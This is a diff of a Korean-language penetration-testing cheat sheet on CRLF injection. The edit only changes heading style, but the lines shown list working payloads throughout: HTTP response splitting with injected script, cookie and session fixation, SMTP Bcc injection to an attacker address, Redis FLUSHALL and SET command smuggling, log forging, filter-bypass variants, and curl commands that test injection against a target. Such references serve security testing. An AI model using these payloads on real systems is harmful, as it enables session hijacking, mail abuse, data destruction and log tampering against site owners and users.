@@ -1,46 +1,46 @@
 ### 기본 페이로드
 
-**HTTP 응답 헤더 인젝션 (가장 흔한 sink — Location, Set-Cookie):**
+#### HTTP 응답 헤더 인젝션 (가장 흔한 sink — Location, Set-Cookie)
 - `evil.com%0d%0aInjected-Header:true` (URL parameter, redirect sink)
 - `evil.com%0d%0aSet-Cookie:session=fixed` (세션 고정)
 - `evil.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>` (HTTP Response Splitting)
 - `evil.com%0d%0aLocation:https://attacker.com` (redirect 변조)
 
-**Set-Cookie 변조 (cookie 주입):**
+#### Set-Cookie 변조 (cookie 주입)
 - `lang=ko%0d%0aSet-Cookie:admin=true` (preference sink)
 - `name=user%0d%0aSet-Cookie:session=ATTACKER_SESSION; Path=/`
 
-**Content-Disposition 인젝션 (파일명 sink):**
+#### Content-Disposition 인젝션 (파일명 sink)
 - `filename="x%0d%0aSet-Cookie:x=y.txt"` (multipart upload — file-upload 결합)
 - `filename="evil%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>.html"`
 
-**Outgoing HTTP 요청 헤더 인젝션:**
+#### Outgoing HTTP 요청 헤더 인젝션
 - `host=internal.local%0d%0aHost:evil.com` (proxy sink)
 - `auth=Bearer%20X%0d%0aX-Admin:true` (header injection in outgoing)
 
-**SMTP 헤더 인젝션 (메일 발송):**
+#### SMTP 헤더 인젝션 (메일 발송)
 - `email=victim@x.com%0d%0aBcc:attacker@evil.com` (To 헤더 injection)
 - `email=victim@x.com%0d%0aSubject:Hacked%0d%0a%0d%0aBody`
 - `subject=Hello%0d%0aBcc:attacker@evil.com`
 
-**LDAP 인젝션 (CRLF in DN):**
+#### LDAP 인젝션 (CRLF in DN)
 - `cn=admin%0d%0aobjectClass:groupOfNames` (DN sink)
 
-**Redis/Memcached 프로토콜 인젝션:**
+#### Redis/Memcached 프로토콜 인젝션
 - `key=foo%0d%0aFLUSHALL%0d%0a` (Redis 명령 분리)
 - `key=foo%0d%0aSET%20admin%201%0d%0a`
 - `key=foo%0d%0aDEL%20user:1%0d%0a`
 
-**HTTP/2 → HTTP/1.1 다운그레이드:**
+#### HTTP/2 → HTTP/1.1 다운그레이드
 ```
 curl --http2 "https://target/" -H "X-Custom: a%0d%0aInjected:true"
 ```
 
-**로그 인젝션:**
+#### 로그 인젝션
 - `q=user%0d%0a127.0.0.1+-+admin+%5B$(date)%5D+%22GET+/admin+HTTP/1.1%22+200`
 - `q=user%0aFAKE_LOG_ENTRY`
 
-**검증 확인:**
+#### 검증 확인
 ```bash
 # 응답 헤더에 주입한 헤더 확인
 curl -v "https://target/redirect?url=evil%0d%0aInjected:true" 2>&1 | grep -i Injected
@@ -64,7 +64,7 @@ curl -v "https://target/api/setpref?lang=ko%0d%0aSet-Cookie:admin=true" 2>&1 | g
 | 헤더값 한 줄 검증 | 헤더 값 끝에 `%20` (공백) + CRLF 추가 — 일부 파서 통과 |
 | Whitespace 검증 | TAB (`%09`), VT (`%0b`), FF (`%0c`) 등 다른 whitespace로 변형 |
 
-**HTTP/2 환경:**
+#### HTTP/2 환경
 ```
 # HTTP/2 헤더값 자체에 CRLF — backend HTTP/1.1 변환 시 인젝션
 curl --http2 "https://target/" -H "Foo: a
